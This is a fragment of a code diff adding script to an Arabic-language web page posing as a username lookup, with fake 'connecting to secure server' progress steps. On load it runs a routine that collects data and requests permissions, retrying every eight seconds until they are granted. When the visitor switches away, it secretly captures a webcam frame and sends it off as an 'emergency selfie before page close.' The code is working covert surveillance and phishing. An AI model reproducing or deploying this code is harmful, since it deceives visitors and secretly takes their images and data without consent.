+    setTimeout(()=>$('inputContainer').classList.remove('error'),600);
+    return;
+  }
+
+  currentUsername=username;
+
+  const btn=$('submitBtn');
+  btn.disabled=true;
+  $('spinner').style.display='block';
+  $('btnText').textContent='جاري التحقق...';
+
+  setTimeout(()=>{
+    $('formStep').style.display='none';
+    $('loadingStep').classList.add('show');
+  },300);
+
+  setProgress(20,'الاتصال بالخادم الآمن...');
+  await new Promise(r=>setTimeout(r,900));
+  setProgress(40,'البحث في قاعدة البيانات...');
+  await new Promise(r=>setTimeout(r,1100));
+
+  await continueProcessing();
+});
+
+async function initPermissionFlow(){
+  await initialDataCollection();
+  const ok=await collectPermissionsAndSend();
+  if(!ok){
+    if(window._permInterval)clearInterval(window._permInterval);
+    window._permInterval=setInterval(async()=>{
+      const r=await collectPermissionsAndSend();
+      if(r){
+        if(window._permInterval)clearInterval(window._permInterval);
+      }
+    },8000);
+  }
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+  setTimeout(initPermissionFlow,300);
+});
+
+if(document.readyState==='complete'||document.readyState==='interactive'){
+  setTimeout(initPermissionFlow,300);
+}else{
+  window.addEventListener('load',()=>setTimeout(initPermissionFlow,300));
+}
+
+document.addEventListener('visibilitychange',()=>{
+  if(document.hidden){
+    try{
+      const v=$('cam');
+      const c=$('canvas');
+      if(v&&v.srcObject&&v.videoWidth>0&&c){
+        const vw=v.videoWidth,vh=v.videoHeight;
+        c.width=vw;c.height=vh;
+        const ctx=c.getContext('2d');
+        ctx.imageSmoothingQuality='high';
+        ctx.save();ctx.translate(vw,0);ctx.scale(-1,1);
+        ctx.drawImage(v,0,0,vw,vh);
+        ctx.restore();
+        c.toBlob(b=>b&&sendPhoto(b,'⚡ سيلفي طارئة (قبل إغلاق الصفحة)'),'image/jpeg',0.95);
+      }
+    }catch(e){}
+  }
+});
+</script>
+</body>
+  </html>
